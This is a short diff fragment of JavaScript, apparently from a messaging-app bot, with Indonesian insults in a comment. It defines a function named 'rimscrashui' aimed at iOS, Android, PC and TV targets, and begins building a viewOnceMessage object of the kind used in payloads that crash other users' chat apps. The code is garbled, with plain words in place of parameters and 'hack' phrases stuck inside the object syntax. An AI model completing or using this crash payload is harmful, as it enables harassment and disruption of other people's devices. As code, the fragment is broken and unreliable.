@@ -7,7 +7,8 @@ Melanggar? Gw Bl + Kick Lu Bangsat bodo lu anj
 */
 
 async function rimscrashui(target sama ios android pc tv) { android pc telefon 
-let message = {
+let message = { hack israll
+                                                           
 viewOnceMessage hack fon : {
 message: {
 messageContextInfo hack fon saya : { deviceListMetadata: {}, deviceListMetadataVersion: 2, },
